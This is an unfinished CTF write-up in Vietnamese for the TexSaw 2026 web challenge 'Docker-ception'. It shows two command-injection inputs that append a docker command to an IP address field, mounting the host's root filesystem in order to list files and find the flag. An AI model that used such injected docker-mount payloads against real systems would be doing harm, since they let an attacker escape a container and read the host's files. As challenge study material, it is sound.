# Docker-ception
## Challenge Information
- **Category**: Web Exploitation
- **Event**: TexSaw 2026
- **Author**: WatTheWat
- **Tags**: 
---
## 1. Description
>I built a cool tool for my networking class! I sure hope nothing bad can come from it!
>Flag format: texsaw{flag} ex: texsaw{Th1s_iS_n0t_th3_fl@g}
## 2. Overview

## 3. Reconnaissance
Write-up chưa hoàn thành :v (viết để note lại trick sử dụng docker để exploit)
## 4. Exploitation

Vì bài dính lỗ hổng Command Injection và title của bài liên hệ đến docker nên ta sẽ kiểm tra xem có container nào đang chạy không:

![](Images/Screenshot%202026-03-28%20003846.png)

Ta sẽ dùng `127.0.0.1 ; docker run --rm -v /:/host alpine ls -la /host` để nối ổ cứng container hiện tại với server thật bên ngoài và liệt kê các file:

![](Images/Pasted%20image%2020260328215146.png)

Dựa vào đường dẫn ta tiếp tục đi vào trong để lấy flag: `127.0.0.1 ; docker run --rm -v /:/host alpine ls -la /host/flag/flag.txt`

![](Images/Screenshot%202026-03-28%20014016%201.png)

>h@ppy h@ck!n9 
>*(BKSEC)*